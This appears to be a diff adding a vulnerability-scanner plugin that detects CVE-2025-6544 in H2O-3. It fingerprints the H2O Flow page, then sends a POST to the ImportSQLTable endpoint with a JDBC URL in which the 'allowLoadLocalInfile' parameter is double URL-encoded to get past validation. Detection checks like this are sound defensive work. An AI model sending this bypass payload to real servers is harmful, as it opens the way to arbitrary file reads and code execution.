@@ -1,0 +1,86 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "H2O_CVE_2025_6544"
+  author: "mangeshwalsane2-hash"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2025-6544"
+  }
+  severity: CRITICAL
+  title: "H2O-3 JDBC Parameter Validation Bypass Leading to Arbitrary File Read and RCE (CVE-2025-6544)"
+  description: "A deserialization vulnerability exists in h2oai/h2o-3 versions <= 3.46.0.8, allowing attackers to read arbitrary system files and execute arbitrary code. The vulnerability arises from improper handling of JDBC connection parameters in SQLManager.validateJdbcUrl, which can be exploited by bypassing regular expression checks using double URL encoding. This issue impacts all users of the affected versions, enabling unauthenticated remote attackers to read arbitrary system files or execute arbitrary code via dangerous JDBC parameters such as allowLoadLocalInfile or autoDeserialize."
+  recommendation: "Upgrade h2oai/h2o-3 to version 3.46.0.9 or higher."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-6544"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_h2o"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "<title>H2O Flow"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "check_jdbc_parameter_bypass"
+  http_request: {
+    method: POST
+    uri: "/99/ImportSQLTable"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
+    ]
+    data: "connection_url=jdbc%3Amysql%3A%2F%2F127.0.0.1%3A3308%2Ftest%3F+%2561%256c%256c%256f%2577%254c%256f%2561%2564%254c%256f%2563%2561%256c%2549%256e%2566%2569%256c%2565%3Dtrue&table=a&username=root&password=root"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "Import SQL Table" },
+          { body: {} contains: "JobV3" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_h2o",
+    "check_jdbc_parameter_bypass"
+  ]
+}
+
